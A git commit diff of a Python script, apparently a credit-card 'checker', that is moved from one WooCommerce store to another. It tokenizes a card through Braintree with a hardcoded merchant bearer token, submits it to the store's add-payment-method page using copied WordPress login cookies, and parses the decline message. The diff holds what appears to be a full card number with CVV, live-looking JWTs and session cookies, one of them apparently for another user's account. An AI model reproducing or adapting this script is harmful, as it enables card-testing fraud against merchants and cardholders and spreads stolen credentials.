784945159960ff8a0bfa197b3dbdfc78741f9792
yousef12102008 <moh552vbnm@gmail.com>
2024-06-15 21:43:18 +0300

    Update mk.py

--- mk.py
+++ mk.py
@@ -18,11 +18,12 @@ def Tele(ccx):
 
 
 
+
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTg1NjAzNTcsImp0aSI6ImVlZjE2Zjk3LWQ5OGItNDU1MC1iMmEzLWU5MGNmN2U4Mzc1NyIsInN1YiI6InI4OHpqaGR5OWhqa3E3em4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InI4OHpqaGR5OWhqa3E3em4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.YolGhB0e8a6jZeHrV8RYdWkzFm529k-vsBxk4-qMJl5G7qx10jscI3BteDLk-6KeACav7fuQLgIDzr4nueypWw',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTg1NjIzOTYsImp0aSI6IjNjOGE2YzZjLTA3Y2EtNDk3Yi1hNDgzLWIyZjU5YTFiODQ1MCIsInN1YiI6IjR3ZHhuYm4zcm5ueWs2dHEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjR3ZHhuYm4zcm5ueWs2dHEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.m9X-9jnutQk8j6kixgLaSU5zD7xYKudzl5-EhaIdoHx6Zc55Eg5dYn3uy8UflrIovPhjnkwi5ri3nXJbE6x1iA',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -42,7 +43,7 @@ def Tele(ccx):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '2f189af9-d8bf-4d72-ba5e-2e26d1b6cdb8',
+        'sessionId': '379f0177-032a-47fd-9e6a-56561cd41a24',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -65,7 +66,7 @@ def Tele(ccx):
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"2f189af9-d8bf-4d72-ba5e-2e26d1b6cdb8"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"10","expirationYear":"2026","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"379f0177-032a-47fd-9e6a-56561cd41a24"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 
 	tok=(response.json()['data']['tokenizeCreditCard']['token'])
@@ -78,39 +79,44 @@ def Tele(ccx):
 
 
 
+
 	cookies = {
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'cookielawinfo-checkbox-necessary': 'yes',
+    '_gcl_au': '1.1.1039263952.1717904732',
+    '_ga': 'GA1.1.1613173725.1717904732',
+    '_fbp': 'fb.1.1717904732684.350208071803167906',
+    'newpass_announce': 'true',
+    'cookielawinfo-checkbox-functional': 'yes',
+    'cookielawinfo-checkbox-performance': 'yes',
+    'cookielawinfo-checkbox-analytics': 'yes',
+    'cookielawinfo-checkbox-advertisement': 'yes',
+    'cookielawinfo-checkbox-others': 'yes',
+    'viewed_cookie_policy': 'yes',
+    'cli_user_preference': 'en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes',
+    'CookieLawInfoConsent': 'eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
+    'wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7': 'lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C1e798985ca18d6a95c6fdeb1670a7a230852986c371511d8a796b428dac518d7',
+    'wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7': 'lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C3c2a280ef9c0b1cd274212c09aee960f1f5391e73fbaebf0a62586a7c563da08',
+    'br_lgv_stat': 'default%7Cdefault',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-06-15%2017%3A48%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-06-15%2017%3A48%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'pys_session_limit': 'true',
-    'pys_start_session': 'true',
-    'pys_first_visit': 'true',
-    'pysTrafficSource': 'direct',
-    'pys_landing_page': 'https://www.thevacuumfactory.com/my-account/edit-address/billing/',
-    'last_pysTrafficSource': 'direct',
-    'last_pys_landing_page': 'https://www.thevacuumfactory.com/my-account/edit-address/billing/',
-    '_gcl_au': '1.1.2003024390.1718473730',
-    '_ga': 'GA1.1.473391276.1718473730',
-    '_fbp': 'fb.1.1718473730709.9440804757617820',
-    'pbid': '69f6c5a74dad044b52a583312ae8a41c2ea16b2e91309a153c2926595a5e4497',
-    'wordpress_logged_in_5a9b1c4730164376cc88c4f3afed3405': 'moh552vbnm%7C1719683356%7CBbtymRlChRrOeIe3WBkcONAxOxN5qUy5TlPy2YKj9fA%7C1d2c14b26024a72f51aa8e706a1649a604dada8cbb01960bbec0e96fbe2046e9',
-    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fadd-payment-method%2F',
-    '_ga_3S1SBY244N': 'GS1.1.1718473730.1.1.1718473991.0.0.0',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'sbjs_udata': 'vst%3D11%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
+    '_uetsid': 'cc9ad4a02b4411ef8ff77f5b1d793947',
+    '_uetvid': 'b873acf0261211efa5545d92dac21af2',
+    '_ga_JVCGZDD7ML': 'GS1.1.1718475996.11.0.1718475996.60.0.1977330465',
 }
 
 	headers = {
-    'authority': 'www.thevacuumfactory.com',
+    'authority': 'ce4less.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-15%2017%3A48%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-06-15%2017%3A48%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://www.thevacuumfactory.com/my-account/edit-address/billing/; last_pysTrafficSource=direct; last_pys_landing_page=https://www.thevacuumfactory.com/my-account/edit-address/billing/; _gcl_au=1.1.2003024390.1718473730; _ga=GA1.1.473391276.1718473730; _fbp=fb.1.1718473730709.9440804757617820; pbid=69f6c5a74dad044b52a583312ae8a41c2ea16b2e91309a153c2926595a5e4497; wordpress_logged_in_5a9b1c4730164376cc88c4f3afed3405=moh552vbnm%7C1719683356%7CBbtymRlChRrOeIe3WBkcONAxOxN5qUy5TlPy2YKj9fA%7C1d2c14b26024a72f51aa8e706a1649a604dada8cbb01960bbec0e96fbe2046e9; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fadd-payment-method%2F; _ga_3S1SBY244N=GS1.1.1718473730.1.1.1718473991.0.0.0',
-    'origin': 'https://www.thevacuumfactory.com',
+    # 'cookie': 'sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; cookielawinfo-checkbox-necessary=yes; _gcl_au=1.1.1039263952.1717904732; _ga=GA1.1.1613173725.1717904732; _fbp=fb.1.1717904732684.350208071803167906; newpass_announce=true; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9; wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7=lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C1e798985ca18d6a95c6fdeb1670a7a230852986c371511d8a796b428dac518d7; wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7=lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C3c2a280ef9c0b1cd274212c09aee960f1f5391e73fbaebf0a62586a7c563da08; br_lgv_stat=default%7Cdefault; sbjs_migrations=1418474375998%3D1; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D11%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F; _uetsid=cc9ad4a02b4411ef8ff77f5b1d793947; _uetvid=b873acf0261211efa5545d92dac21af2; _ga_JVCGZDD7ML=GS1.1.1718475996.11.0.1718475996.60.0.1977330465',
+    'origin': 'https://ce4less.com',
     'pragma': 'no-cache',
-    'referer': 'https://www.thevacuumfactory.com/my-account/add-payment-method/',
+    'referer': 'https://ce4less.com/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -131,17 +137,12 @@ def Tele(ccx):
     'wc_braintree_credit_card_payment_nonce': tok,
     'wc_braintree_device_data': '',
     'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': '2199294e53',
+    'woocommerce-add-payment-method-nonce': '3cc96dcfa8',
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
 }
 
-	response = requests.post(
-    'https://www.thevacuumfactory.com/my-account/add-payment-method/',
-    cookies=cookies,
-    headers=headers,
-    data=data,
-)
+	response = requests.post('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
 	text=(response.text)
 	import re
 	pattern = r"Status code \d+: (.+?)\s*</li>"
